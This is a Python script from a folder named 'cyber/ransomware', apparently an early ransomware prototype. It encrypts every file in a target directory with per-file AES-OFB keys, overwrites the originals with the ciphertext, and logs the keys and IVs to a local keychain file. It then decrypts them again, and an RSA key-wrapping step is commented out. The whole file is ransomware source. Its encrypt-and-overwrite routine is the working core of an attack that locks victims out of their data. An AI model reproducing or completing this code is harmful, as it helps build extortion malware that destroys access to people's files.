import random
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from cryptography.fernet import Fernet

from os import listdir
from os.path import isfile, join
import tsetrsa

key_size = 32
until_iv_size = 48

mypath = "/home/daniel/git/cyber/ransomware/files_to_encrypt/"
keychain_path = "/home/daniel/git/cyber/ransomware/keychain.txt"


def get_key(): 
    return get_random_bytes(32)  # key generation

def append_to_keychain(file,key,iv):
    global keychain_path
    encoded = file.encode()
    with open(keychain_path, 'ab') as keychain:
        to_write = encoded +b":" + key  + iv + b"\n"
        print("all the line i am writing - ",to_write)
        keychain.write(to_write)

def extract_key_from_keychain(file):
    bin_filename = bytes(file,'utf-8')
    with open(keychain_path, 'rb') as keychain:
        for line in keychain:
            if line.startswith(bin_filename):
                return line.split(b':')[1]
        

    print("didnt find, sorry")
         

def encrypt_files():
    global mypath
    files_list = [f for f in listdir(mypath) if isfile(join(mypath, f))]  # return list of the files
     
    for file in files_list: 
        key = get_key()
        escaped_text = key.replace(b':', b's')
        escaped_text = escaped_text.replace(b'\n', b'w')
        escaped_text = escaped_text.replace(b'\\', b'w')
        key = escaped_text

        with open(file, 'rb') as opened_file:    # opening the original file to encrypt
            original = opened_file.read()
            cipher = AES.new(key, AES.MODE_OFB)
            encrypted = cipher.encrypt(original)
            iv = cipher.iv
            escaped_text = iv.replace(b':', b's')
            escaped_text = escaped_text.replace(b'\n', b'w')
            iv = escaped_text
            print("key to add - ",key)
            print("iv to add - ",iv) 
            append_to_keychain(file,key,iv) 
 
        with open(file, 'wb') as encrypted_file:   # opening the file in write mode and
            encrypted_file.write(encrypted)     # writing the encrypted data
            
            
            
def decrypt():     
    global mypath
    global key_size
    global iv_size
    files_list = [f for f in listdir(mypath) if isfile(join(mypath, f))]  # return list of the files  
    for file in files_list:   
        line = extract_key_from_keychain(file)
        key = line[:key_size]
        iv = line[key_size:until_iv_size]
        print("now file: ",file)
        print("all the line - ",line)
        print("key extracted -",key)
        print("iv extracted - ",iv)
                     
        with open(file, 'rb') as enc_file:   # opening the encrypted file
            encrypted = enc_file.read()
            decrypt_cipher = AES.new(key, AES.MODE_OFB, iv=iv)
            plain_text = decrypt_cipher.decrypt(encrypted)
        
        with open(file, 'wb') as dec_file:   # opening the file in write mode and writing the decrypted data
            dec_file.write(plain_text)


def empty_keychain():
        with open(keychain_path, 'wb') as keychain:
            keychain.write(b"")
            

def main():
    encrypt_files()
    # tsetrsa.encrypt_rsa()
    # tsetrsa.decrypt_rsa()
    decrypt()
    


if __name__=="__main__":
    empty_keychain() 
    main()
